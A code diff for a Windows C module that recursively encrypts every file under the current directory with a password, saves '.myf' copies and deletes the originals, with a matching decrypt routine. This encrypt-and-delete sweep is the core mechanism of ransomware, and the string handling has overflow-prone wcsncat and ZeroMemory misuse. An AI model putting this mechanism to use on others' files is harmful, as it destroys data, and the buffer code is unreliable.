@@ -1,5 +1,6 @@
 #include "crypt.h"
 
+#define _CRT_SECURE_NO_WARNINGS
 #include <string.h>
 #define UNICODE
 #include <Windows.h>
@@ -11,17 +12,18 @@ typedef UCHAR CryptSalt[16];
 typedef BYTE CryptIV[16];
 
 static BOOL Crypt_IsEncrypted(HANDLE hFile, LONGLONG *pFileSize);
-static BOOL Crypt_EncryptFile(LPWSTR pwszFilename, PUCHAR pbPassword, const wchar_t **ignore);
-static BOOL Crypt_DecryptFile(LPWSTR pwszFilename, PUCHAR pbPassword);
+
+static BOOL Crypt_EncryptDirectory(LPWSTR pwszDirectory, PUCHAR pbPassword, const wchar_t **ignore);
+static BOOL Crypt_DecryptDirectory(LPWSTR pwszDirectory, PUCHAR pbPassword, const wchar_t **ignore);
 
 bool Crypt_Encrypt(const char *password, const wchar_t **ignore)
 {
-	if (Crypt_EncryptFile(L"hello.txt", (PUCHAR)password, ignore)) {
-		DeleteFile(L"hello.txt");
-		BOOL result = Crypt_DecryptFile(L"hello.txt.myf", (PUCHAR)"FUCKOFFFFF");
-		result = Crypt_DecryptFile(L"hello.txt.myf", (PUCHAR)password);
-	}
-	return true;
+	return Crypt_EncryptDirectory(L".", (PUCHAR)password, ignore);
+}
+
+bool Crypt_Decrypt(const char *password, const wchar_t **ignore)
+{
+	return Crypt_DecryptDirectory(L".", (PUCHAR)password, ignore);
 }
 
 BOOL Crypt_IsEncrypted(HANDLE hFile, LONGLONG *pFileSize)
@@ -45,17 +47,53 @@ BOOL Crypt_IsEncrypted(HANDLE hFile, LONGLONG *pFileSize)
 	return magic[0] == '\t' && magic[1] == '\n' && magic[2] == 'M' && magic[3] == 'F';
 }
 
-BOOL Crypt_EncryptFile(LPWSTR pwszFilename, PUCHAR pbPassword, const wchar_t **ignore)
+static BOOL Crypt_EncryptFile(LPWSTR pwszFilename, PUCHAR pbPassword);
+
+BOOL Crypt_EncryptDirectory(LPWSTR pwszDirectory, PUCHAR pbPassword, const wchar_t **ignore)
+{
+	HANDLE hFind = INVALID_HANDLE_VALUE;
+
+	WIN32_FIND_DATA findFileData;
+	WCHAR wszFileName[MAX_PATH] = { L'\0' };
+	wcsncat(wszFileName, pwszDirectory, MAX_PATH - 1);
+	wcsncat(wszFileName, L"\\*", MAX_PATH - 1);
+
+	hFind = FindFirstFile(wszFileName, &findFileData);
+	if (hFind == INVALID_HANDLE_VALUE)
+		return FALSE;
+
+	do {
+		if (wcscmp(findFileData.cFileName, L".") == 0 || wcscmp(findFileData.cFileName, L"..") == 0)
+			continue;
+		ZeroMemory(wszFileName, MAX_PATH);
+		wcsncat(wszFileName, pwszDirectory, MAX_PATH - 1);
+		wcsncat(wszFileName, L"\\", MAX_PATH - 1);
+		wcsncat(wszFileName, findFileData.cFileName, MAX_PATH - 1);
+
+		if (ignore != NULL) {
+			BOOL bIgnore = FALSE;
+			for (size_t i = 0; ignore[i] != NULL; ++i) {
+				if (wcscmp(wszFileName, ignore[i]) == 0)
+					bIgnore = TRUE;
+			}
+			if (bIgnore)
+				continue;
+		}
+
+		if ((findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
+			Crypt_EncryptDirectory(wszFileName, pbPassword, ignore);
+		else {
+			if (Crypt_EncryptFile(wszFileName, pbPassword))
+				DeleteFile(wszFileName);
+		}
+	} while (FindNextFile(hFind, &findFileData));
+
+	return TRUE;
+}
+
+BOOL Crypt_EncryptFile(LPWSTR pwszFilename, PUCHAR pbPassword)
 {
 	assert(pwszFilename != NULL && pbPassword != NULL);
-
-	/* Checking whether this file is in the ignore list. */
-	if (ignore != NULL) {
-		for (size_t i = 0; ignore[i] != NULL; ++i) {
-			if (wcscmp(pwszFilename, ignore[i]) == 0)
-				return FALSE;
-		}
-	}
 
 	BOOL bResult = FALSE;
 
@@ -68,9 +106,9 @@ BOOL Crypt_EncryptFile(LPWSTR pwszFilename, PUCHAR pbPassword, const wchar_t **i
 	PUCHAR pbKeyObject = NULL;
 	DWORD cbKeyObject;
 
-	PUCHAR pbInput;
+	PUCHAR pbInput = NULL;
 	LONGLONG cbInput;
-	PUCHAR pbEncrypted;
+	PUCHAR pbEncrypted = NULL;
 	ULONG cbEncrypted;
 
 	BCRYPT_ALG_HANDLE hAlgorithm = NULL;
@@ -207,8 +245,8 @@ BOOL Crypt_EncryptFile(LPWSTR pwszFilename, PUCHAR pbPassword, const wchar_t **i
 	
 	/* Creating the new file and writing the data there. */
 	WCHAR wszOutputFilename[MAX_PATH] = { L'\0' };
-	wcsncpy(wszOutputFilename, pwszFilename, cbFilename);
-	wcsncpy(wszOutputFilename + cbFilename, L".myf", MAX_PATH - cbFilename);
+	wcsncat(wszOutputFilename, pwszFilename, MAX_PATH - 1);
+	wcsncat(wszOutputFilename + cbFilename, L".myf", MAX_PATH - 1);
 	hFile = CreateFile(wszOutputFilename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
 	if (hFile == INVALID_HANDLE_VALUE)
 		goto cleanup;
@@ -245,6 +283,50 @@ cleanup:
 	return bResult;
 }
 
+static BOOL Crypt_DecryptFile(LPWSTR pwszFilename, PUCHAR pbPassword);
+
+BOOL Crypt_DecryptDirectory(LPWSTR pwszDirectory, PUCHAR pbPassword, const wchar_t **ignore)
+{
+HANDLE hFind = INVALID_HANDLE_VALUE;
+
+	WIN32_FIND_DATA findFileData;
+	WCHAR wszFileName[MAX_PATH] = { L'\0' };
+	wcsncat(wszFileName, pwszDirectory, MAX_PATH - 1);
+	wcsncat(wszFileName, L"\\*", MAX_PATH - 1);
+
+	hFind = FindFirstFile(wszFileName, &findFileData);
+	if (hFind == INVALID_HANDLE_VALUE)
+		return FALSE;
+
+	do {
+		if (wcscmp(findFileData.cFileName, L".") == 0 || wcscmp(findFileData.cFileName, L"..") == 0)
+			continue;
+		ZeroMemory(wszFileName, MAX_PATH);
+		wcsncat(wszFileName, pwszDirectory, MAX_PATH - 1);
+		wcsncat(wszFileName, L"\\", MAX_PATH - 1);
+		wcsncat(wszFileName, findFileData.cFileName, MAX_PATH - 1);
+
+		if (ignore != NULL) {
+			BOOL bIgnore = FALSE;
+			for (size_t i = 0; ignore[i] != NULL; ++i) {
+				if (wcscmp(wszFileName, ignore[i]) == 0)
+					bIgnore = TRUE;
+			}
+			if (bIgnore)
+				continue;
+		}
+
+		if ((findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
+			Crypt_DecryptDirectory(wszFileName, pbPassword, ignore);
+		else {
+			if (Crypt_DecryptFile(wszFileName, pbPassword))
+				DeleteFile(wszFileName);
+		}
+	} while (FindNextFile(hFind, &findFileData));
+
+	return TRUE;
+}
+
 BOOL Crypt_DecryptFile(LPWSTR pwszFilename, PUCHAR pbPassword)
 {
 	BOOL bResult = FALSE;
@@ -258,9 +340,9 @@ BOOL Crypt_DecryptFile(LPWSTR pwszFilename, PUCHAR pbPassword)
 	PUCHAR pbKeyObject = NULL;
 	DWORD cbKeyObject;
 
-	PUCHAR pbInput;
+	PUCHAR pbInput = NULL;
 	ULONG cbInput;
-	PUCHAR pbDecrypted;
+	PUCHAR pbDecrypted = NULL;
 	ULONG cbDecrypted;
 
 	BCRYPT_ALG_HANDLE hAlgorithm = NULL;
